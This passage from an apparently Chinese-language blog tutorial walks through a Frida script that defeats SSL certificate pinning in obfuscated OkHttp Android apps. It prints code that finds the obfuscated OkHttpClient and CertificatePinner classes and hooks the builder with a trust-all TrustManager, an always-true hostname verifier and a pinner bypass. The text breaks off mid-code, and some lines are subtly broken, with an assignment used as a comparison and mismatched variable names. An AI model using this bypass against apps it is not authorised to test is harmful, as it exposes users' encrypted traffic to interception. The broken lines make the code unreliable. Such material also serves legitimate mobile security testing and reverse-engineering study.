class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数initConsole的作用是扩展JavaScript的console对象，使得能够<strong>在控制台中输出带有颜色的文本</strong>。它通过定义一个Color对象和一个LightColor对象来包含ANSI转义代码，这些代码用于设置终端中的文本颜色和样式。</p><p>具体来说，这个函数做了以下几件事情：</p><ol><li>定义了一个Color对象，包含了默认的前景色（文本颜色）和背景色，以及一些基本的文本颜色代码，如黑、蓝、绿等。</li><li>定义了一个LightColor对象，包含了与Color相同的颜色，但是这些颜色是亮色的版本。</li><li>定义了colorPrefix和colorSuffix变量，这两个变量用于构造ANSI转义代码，用于在终端中设置文本颜色。</li><li>使用Object.keys(Color)获取Color对象的所有键（颜色名），然后使用forEach遍历这些键。</li><li>对于每个颜色名（除了”RESET”），这个函数会为console对象添加两个新方法：一个用于普通颜色，一个用于亮色。例如，如果颜色名是”Red”，则添加console.Red和console.LightRed两个方法。</li><li>当这些新方法被调用时，它们会使用相应的ANSI转义代码来设置文本颜色，然后打印传入的消息，最后将颜色重置为默认。</li></ol><p>通过调用initConsole()，你可以在控制台中使用如console.Red(“Error message”)的方式来输出红色文本，或者使用console.LightGreen(“Info message”)来输出亮绿色文本。这有助于在日志输出中区分不同的信息级别或类型。</p><h2 id="loadOkhttpClient"><a href="#loadOkhttpClient" class="headerlink" title="loadOkhttpClient()"></a>loadOkhttpClient()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//提前加载okhttpclient，不然spawn的时候会报错</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadOkhttpClient</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;Okhttps.OkhttpClient&quot;</span>)  <span class="comment">//这块类名混淆后的话，我们可以运行代码后保存后，修改参数，重新加载</span></span><br><span class="line">        &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loadOKhttpClient(）函数的主要作用是在开始Hook前，就加载”Okhttps.OkhttpClient”。</p><p>防止通过spawn方法加载脚本的时候，没有完全加载进去所有的类，导致脚本报错。</p><p><code>Java.use(&quot;Okhttps.OkhttpClient&quot;) </code> 里面的参数，根据下面<code>findOkhttpClass()</code>函数的实际情况进行修改。</p><h2 id="loadClasses"><a href="#loadClasses" class="headerlink" title="loadClasses()"></a>loadClasses()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个数组，遍历内存中的所有类，将所有类名放入数组中。</span></span><br><span class="line"><span class="keyword">var</span> classNames = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadClasses</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">clasName,handle</span>)&#123;</span><br><span class="line">                classNames.<span class="title function_">push</span>(clasName)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Search classes complete!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作用：调用<code>frida</code> 的 <code>API</code> <code>&quot;Java.enumerateClassLoaders&quot; </code>遍历内存中所有的类，并将这些类放到数组中方便后面调用。</p><h2 id="findOkhttpClass-关键"><a href="#findOkhttpClass-关键" class="headerlink" title="findOkhttpClass()-关键"></a>findOkhttpClass()-关键</h2><p>找到内存中的 “<strong>OkhttpClient</strong>“ 和 “<strong>CertificatePinner</strong>“ 类。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义了三个变量，赋值为空</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OkhttpClinetClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CertificatePinnerClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> perfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findOkhttpClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)  <span class="comment">//Modifier是反射框架提供的一个类，可以判断当前这个类的一些属性，如final、static等</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义了一个函数isOkhttpClient，传入参数为类名clsName</span></span><br><span class="line">        <span class="comment">//作用：获取到经过混淆后的OkhttpClient类名</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isOkhttpClient</span>(<span class="params">clsName</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;  <span class="comment">//判断类名长度必须为2</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">                <span class="keyword">var</span> interfaces = cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>() <span class="comment">//通过反射获取当前类的接口</span></span><br><span class="line">                <span class="keyword">const</span> count = interfaces.<span class="property">length</span>  <span class="comment">//接口数量</span></span><br><span class="line">                <span class="keyword">if</span>(count &lt; <span class="number">2</span>)&#123;    <span class="comment">//OkhttpClient类继承的接口数量要求大于等于2</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> interface_ = interfaces[i]</span><br><span class="line">                    <span class="keyword">var</span> interface_name = interface_.<span class="title function_">getName</span>()  <span class="comment">//遍历获得OkhttpClient类继承的接口</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;Cloneable&quot;</span>) &gt; <span class="number">0</span>)&#123;   <span class="comment">//接口名称包含&quot;Cloneable&quot;。这块cloneable是OKhttpclient类实现的一个接口</span></span><br><span class="line">                        flag = <span class="literal">true</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &lt;= <span class="number">0</span>)&#123;   <span class="comment">//判断当前接口是否是内部类，如果不是返回false</span></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//如果在遍历过程中没有找到包含&quot;Cloneable&quot;的接口，函数返回false。</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> &lt; <span class="number">1</span>)&#123; <span class="comment">//检查这个类至少包含一个内部类，如果没有返回false</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&#x27;java.lang.Object&#x27;</span>)&#123; <span class="comment">//因为OkhttpClient这个类的没有父类，所以默认他的父类为 Object</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">///定义了一个函数isCertificatePinner</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isCertificatePinner</span>(<span class="params">clsName,prefix</span>)&#123;      </span><br><span class="line">            <span class="keyword">if</span>(!clsName.<span class="title function_">startsWith</span>(prefix))&#123;  <span class="comment">//检查保密是否以prefix位前缀，若不是返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;  <span class="comment">//判断当前类是否是内部类，如果是返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;  <span class="comment">//判断当前类以&quot;.&quot;分割后，长度是否为2，如果不是返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;  <span class="comment">//判断当前类是否是接口，如果是返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>().<span class="property">length</span> &gt; <span class="number">0</span>)&#123;   <span class="comment">//判断当前类是否有接口，如果有返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> = <span class="number">0</span>)&#123; <span class="comment">//判断当前类中内部类的个数，如果没有返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&quot;java.lang.Object&quot;</span>)&#123;  <span class="comment">//判断当前类是否继承了Object类，如果没有返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title class_">Modifier</span>.<span class="title function_">isFinal</span>(cls.<span class="property">class</span>.<span class="title function_">getModifiers</span>()))&#123; <span class="comment">//判断当前类是否是final修饰的，如果是返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> methods = cls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()  <span class="comment">//获取当前类的所有方法</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> method = methods[i]</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;  <span class="comment">//判断当前方法是否有参数，如果没有则continue</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>() == <span class="string">&quot;java.security.cert.Certificate&quot;</span>)&#123; <span class="comment">//判断当前方法的第一个参数类型是否是Certificate类型</span></span><br><span class="line">                    flag = <span class="literal">true</span> <span class="comment">//如果有方法参数为Certificate类型，那么就认为是okhttp3.CertificatePinner类</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span>  <span class="comment">//如果没有方法参数为Certificate类型，那么就认为不是okhttp3.CertificatePinner类</span></span><br><span class="line"></span><br><span class="line">            flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> fields = cls.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>()   <span class="comment">//通过反射获取类的所有声明字段。这些字段包括私有、保护、默认（包）访问级别的字段，但不包括继承的字段</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; fields.<span class="property">length</span>; k++)&#123;</span><br><span class="line">                <span class="keyword">var</span> field = fields[k];</span><br><span class="line">                <span class="keyword">if</span>(field.<span class="title function_">getType</span>().<span class="title function_">getName</span>() == <span class="string">&quot;java.util.Set&quot;</span>)&#123;  <span class="comment">//检查当前字段的类型是否是集合(java.util.Set)</span></span><br><span class="line">                    flag = <span class="literal">true</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//for循环，调用isOkhttpClient方法，找到OkhttpClient这个类</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isOkhttpClient</span>(classesNames[i]))&#123;</span><br><span class="line">                <span class="title class_">OkhttpClientClassName</span> = classesNames[i]</span><br><span class="line">                <span class="comment">//获取OkhttpClinetClassName类的前缀，比如okhttp3.OkHttpClient，得到了okhttp3.</span></span><br><span class="line">                <span class="keyword">var</span> prefix = classesNames[i].<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]+<span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for循环，调用isCertificatePinner方法，找到isCertificatePinner类</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isCertificatePinner</span>(classesNames[i],prefix))&#123;</span><br><span class="line">                <span class="title class_">CertificatePinnerClassName</span> = classesNames[i]</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> printOut</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">OkhttpClientClassName</span> == <span class="string">&quot;&quot;</span> || <span class="title class_">CertificatePinnerClassName</span> == <span class="string">&quot;&quot;</span> || prefix == <span class="string">&quot;&quot;</span>)&#123; <span class="comment">//如果没有找到okhttp3.OkHttpClient类和okhttp3.CertificatePinner类，那么就返回false</span></span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Red</span></span><br><span class="line">            <span class="title function_">printOut</span>(<span class="string">&quot;Can&#x27;t find the okhttp class&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Green</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印相关字段，如类名前缀、OkhttpClient类、OkhttpCertificatePinner类</span></span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found Class: &quot;</span>+classesNames.<span class="property">length</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Okhttp&#x27;s package prefix: &quot;</span>+prefix)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpClient: &quot;</span>+<span class="title class_">OkhttpClientClassName</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpCertificatePinner: &quot;</span>+<span class="title class_">CertificatePinnerClassName</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、首先，定义了一个 反射类<code>Modifier</code>,该类是反射框架提供的一个类，可以判断当前这个类的一些属性，如final、static等</p><p>2、定义了一个函数<code>isOkhttpClient</code>，传入参数为类名<code>clsName</code>，作用是获取到经过混淆后的<code>OkhttpClient</code>类名</p><ul><li><p>要求类名长度必须为2（正常的<code>OkHttpClient</code>全名为<code>okhttp3.OkHttpClient</code>）</p></li><li><p>要求实现的接口数量大于等于2（默认<code>OkHttpClient</code>实现了2个接口）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OkHttpClient</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span>, Call.Factory &#123;</span><br><span class="line">    <span class="comment">// 类的实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Cloneable</code>: 这个接口来自 Java 标准库，表明 <code>OkHttpClient</code> 类可以被克隆。</p><p><code>Call.Factory</code>: 这个接口是 <code>OkHttp</code> 库的一部分，它定义了创建 <code>Call</code> 实例的方法。<code>Call</code> 对象用于发起 HTTP 请求。</p></li><li><p><code>for</code> 循环遍历所有接口，检查是否包含 <code>Cloneable</code> 接口，并且确保其他接口是内部类接口（通过接口名中包含 <code>$</code> 符号来判断）</p></li><li><p>检查<code>OkHttpClient</code> 类是否至少包含一个内部类。如果没有返回false</p></li><li><p>因为 <code>OkHttpClient</code> 是一个顶层类，其父类应该是 <code>Object</code>。</p></li></ul><p>如果上述条件都满足，就可以认为这个类是 <code>OkhttpClient</code> 类。</p><p>3、定义了一个函数<code>isCertificatePinner</code>，用来获取经过混淆后的<code>CertificatePinner</code>类</p><ul><li>检查包名是否以prefix为前缀，若不是返回false，因为<code>CertificatePinner</code>和<code>OkhttpClient</code>都属于<code>Okhttp3</code>这个包名下的。</li><li>判断当前类是否是内部类，<code>CertificatePinner</code>不是一个内部类</li><li>判断当前类以”.”分割后，长度是否为2，如果不是返回false</li><li>判断当前类是否是接口，如果是返回false</li><li>判断当前类是否有接口，如果有返回false</li><li>判断当前类中内部类的个数，如果没有返回false</li><li>判断当前类是否继承了Object类，如果没有返回false，因为<code>CertificatePinner</code>是顶级类</li><li>判断当前类是否是final修饰的，如果是返回false</li><li>获取当前类中的所有方法，如果有方法参数为<code>Certificate</code>类型，那么就认为是<code>okhttp3.CertificatePinner</code>类。</li></ul><h2 id="hook"><a href="#hook" class="headerlink" title="hook()"></a>hook()</h2><p>这块对前面讲的三种Hook思路进行实现。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)  <span class="comment">//Modifier 反射框架提供的一个类，可以判断当前这个类的一些属性，如final、static等</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//TrustAllManager：这段代码的目的是创建一个 SSL 上下文，它使用一个自定义的信任管理器来信任所有的 SSL 证书。</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustAllManagerClass</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;    <span class="comment">//Java.registerClass是firda提供的，用于动态注册一个 Java 类</span></span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;TrustAllManager&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.X509TrustManager&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">checkClientTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkClientTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">checkServerTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkServerTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">getAcceptedIssuers</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> [];</span><br><span class="line">                &#125;,</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> trustAllManagerHandle = <span class="title class_">TrustAllManagerClass</span>.$new()  <span class="comment">//创建了一个 TrustAllManager 类的实例trustAllManagerHandle</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sslContext = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.SSLContext&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;TLS&quot;</span>) <span class="comment">//获取了一个 SSLContext 实例，用于创建 SSL 套接字和引擎</span></span><br><span class="line">        sslContext.<span class="title function_">init</span>(<span class="literal">null</span>,<span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;Ljavax.net.ssl.X509TrustManager;&quot;</span>,[trustAllManagerHandle]),<span class="literal">null</span>) <span class="comment">//初始化 SSLContext，传入我们创建的 trustAllManagerHandle 作为信任管理器。</span></span><br><span class="line">        <span class="keyword">var</span> sslSocketFactory = sslContext.<span class="title function_">getSocketFactory</span>() <span class="comment">//从 SSLContext 对象中获取一个 SSLSocketFactory，这个工厂可以用来创建 SSL 套接字，这些套接字将会使用我们的自定义信任管理器，从而信任所有的 SSL 证书</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//HostnameVerify：</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">MyHostnameVerify</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;MyHostnameVerify&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">verify</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(hostname)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> myHostnameVerifyHandle = <span class="title class_">MyHostnameVerify</span>.$new()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> internalOkhttpClientClasses = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">OkhttpClientClassName</span>).<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>() <span class="comment">//获取 OkhttpClientClassName 类声明的所有内部类</span></span><br><span class="line">        internalOkhttpClientClasses.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">internalClass</span>) &#123; <span class="comment">//遍历上一步获取到的所有内部类</span></span><br><span class="line">            <span class="keyword">var</span> methods = internalClass.<span class="title function_">getDeclaredMethods</span>() <span class="comment">//获取内部类的所有方法</span></span><br><span class="line">            methods.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>) &#123;</span><br><span class="line">                 <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;  <span class="comment">//检查方法是否有参数。如果没有参数，则跳过当前方法的处理</span></span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> firstParameterTypeName = method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>()  <span class="comment">//获取方法第一个参数的类型名称。</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.SSLSocketFactory&quot;</span>)&#123; <span class="comment">//检查第一个参数是否是 SSLSocketFactory 类型，如果是执行下面代码</span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())  <span class="comment">//获取okhttp.okhttpclinet$builder</span></span><br><span class="line">                    <span class="keyword">var</span> sslSocketFacotryMethodName  = method.<span class="title function_">getName</span>()  <span class="comment">//获取方法的名称</span></span><br><span class="line">                    <span class="title class_">Builder</span>[sslSocketFacotryMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;  <span class="comment">//遍历该方法的所有重载版本。</span></span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">SSLSocketFactory</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = sslSocketFactory</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[sslSocketFacotryMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Blue</span>(sslSocketFacotryMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)&#123;  <span class="comment">//检查第一个参数是否是 HostnameVerifier 类型，如果是执行下面代码。逻辑同上</span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> hostnameVerifierMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                    <span class="title class_">Builder</span>[hostnameVerifierMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostnameVerifier</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = myHostnameVerifyHandle</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[hostnameVerifierMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Yellow</span>(hostnameVerifierMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="title class_">CertificatePinnerClassName</span>)&#123;  <span class="comment">//检查第一个参数是否是 CertificatePinnerClassName 类型</span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> certificatePinnerMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line"></span><br><span class="line">                    <span class="title class_">Builder</span>[certificatePinnerMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">certificatePinner</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">retain</span>(<span class="variable language_">this</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Purple</span>(certificatePinnerMethodName+<span 